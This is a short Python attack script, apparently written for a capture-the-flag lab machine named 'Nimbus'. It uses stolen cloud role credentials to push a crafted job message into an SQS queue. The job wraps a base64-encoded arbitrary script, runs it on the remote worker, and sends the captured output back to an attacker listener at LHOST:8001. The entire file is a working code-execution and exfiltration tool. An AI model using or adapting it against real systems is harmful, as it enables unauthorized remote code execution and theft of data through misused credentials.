#!/usr/bin/env python3
import sys, os, subprocess, textwrap, base64, json

LHOST = sys.argv[1]
TAG = sys.argv[2]
SCRIPT = sys.argv[3] if len(sys.argv) > 3 else sys.stdin.read()

encoded = base64.b64encode(SCRIPT.encode()).decode()
wrapper = f"""
import sys, io, traceback, urllib.request, base64
_buf = io.StringIO()
sys.stdout = _buf; sys.stderr = _buf
try:
    exec(base64.b64decode({encoded!r}).decode())
except: traceback.print_exc()

sys.stdout = sys.__stdout__
data = _buf.getvalue().encode()
urllib.request.urlopen("http://{LHOST}:8001/{TAG}", data=data, timeout=10)
"""

full = "\n".join("  " + l for l in wrapper.strip().splitlines())
body = f"name: j-{TAG}\nschedule: manual\nruntime: python3.11\nscript: |\n{full}\n"

creds = json.load(open("Nimbus/nimbus_web_role_creds.json"))
import boto3
sqs = boto3.client("sqs", endpoint_url="http://10.129.16.167", region_name="us-east-1",
                   aws_access_key_id=creds["AccessKeyId"], aws_secret_access_key=creds["SecretAccessKey"],
                   aws_session_token=creds.get("Token",""))
r = sqs.send_message(QueueUrl="http://aws.nimbus.htb/847219365028/nimbus-jobs", MessageBody=body)
print(f"SENT job tag={TAG} ({len(body)} bytes) id={r['MessageId']}")
